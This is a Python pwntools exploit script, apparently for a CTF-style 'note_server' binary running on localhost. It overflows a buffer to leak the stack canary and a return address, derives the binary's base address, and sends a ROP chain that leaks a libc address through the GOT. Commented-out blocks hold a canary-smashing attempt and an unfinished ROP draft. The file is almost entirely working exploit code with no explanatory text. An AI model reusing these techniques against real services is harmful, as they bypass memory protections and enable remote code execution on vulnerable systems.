from pwn import *
from concurrent import futures
from base64 import b64encode,b64decode
from time import sleep

RHOST = '127.0.0.1'
RPORT = '5001'
context.arch = 'amd64'
context.os = 'linux'

buffer_filler = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
smash_cpy = b'\x02\x00\x00\xff'
legal_cpy = b'\x02\x00\x04\xff'
read = b'\x03'
fill = b'\x01\x04\xde\xad\xbe\xef'
bin_offset = 0x1674

def flip_endian(word):
    word = int(word,16) # ret is a le hex string
    word = p64(word) # flips endian of a string
    word = word.hex() # be
    return word

def deliver_payload(payload):
    r.send(payload)
    return r.recv().hex()

################################################################################
# CANARY
################################################################################
r=remote(RHOST,RPORT)
payload = buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += legal_cpy
payload += read

raw = deliver_payload(payload)

EOB=1024*2
trash = raw[EOB:EOB+16]
canary = raw[EOB+16:EOB+32]
ebp = raw[EOB+32:EOB+48]
ret = raw[EOB+48:EOB+64]

base_addr = flip_endian(ret)
base_addr = int(base_addr,16) - bin_offset
base_addr = hex(base_addr) 
base_big_string = base_addr
print(flip_endian(trash))
print(flip_endian(canary))
print(flip_endian(ebp))
print(flip_endian(ret))
r.close()


################################################################################
# SMASH THROUGH CANARY
################################################################################
'''
r=remote(RHOST,RPORT)

canary = 0x7a117c4776371000
b_canary = p64(canary)

base = 0x0000561410c94674
b_base = p64(base-0x1674)

pad = b'b'*231
payload = b'\x01\xffaaaabbbb' + b_canary + b_base +pad
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += smash_cpy
payload += read
raw = deliver_payload(payload)
print(raw)
r.close()
'''

################################################################################
# --- leak libc
################################################################################

canary = 0xe770dedb2dac6500
b_canary = p64(canary)


base = 0x00005571c2f8e674
b_base = p64(base-0x1674).decode('latin-1')
bin_base = u64(b_base)

elf  = ELF("./note_server",checksec=False)
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so",checksec=False)
elf.address = bin_base
rop = ROP(elf)

rop.write(0x4,elf.got['write'])
r=remote(RHOST,RPORT)
chain = rop.chain()

pad = b'b'*183
payload = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00' + b_canary + b'\x00\x00\x00\x00\x00\x00\x00\x00' + chain
payload += pad
payload += buffer_filler
payload += buffer_filler
payload += buffer_filler
payload += fill
payload += smash_cpy
payload += read
print(deliver_payload(payload))

'''
ropper:   pop rdi; ret 
int:      SOCKFD       
ropper:   pop rsi; ret 
readelf:  got.send     
ropper:   pop rdx; ret 
objdump:  call write   

pop_rdi = bin_base + 0x16eb
pop_rsi_pop_r15_ret = bin_base + 0x16e9
got_err = 0x3fb0
pop_rdx = 
call_write = 

pop_rdi_ret =         bin_base + 0x16eb
pop_rsi_pop_r15_ret = bin_base + 0x16e9
pop_rdx_ret =         bin_base + 0x1265
got_send =            bin_base + 0x4050
call_write =          bin_base + 0x154e

rop  = p64(pop_rdi_ret)
rop += p64(SOCKFD)
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(got_send)
rop += "C"*8
rop += p64(pop_rdx_ret)
rop += p64(8)
rop += p64(call_write)

payload = "A"*56
payload += CANARY
payload += "B"*8
payload += str(rop)

# send payload
con = remote("localhost", 1337)
con.send(payload)
con.recvline()
res = con.clean(timeout=TIMEOUT)
con.close()

# get libc base address
libc_send = u64(res)
print("[\033[92m+\033[0m] libc_send = " + hex(libc_send))
libc.address = libc_send - libc.sym["send"]
print("[\033[92m+\033[0m] libc_base = " + hex(libc.address))
'''
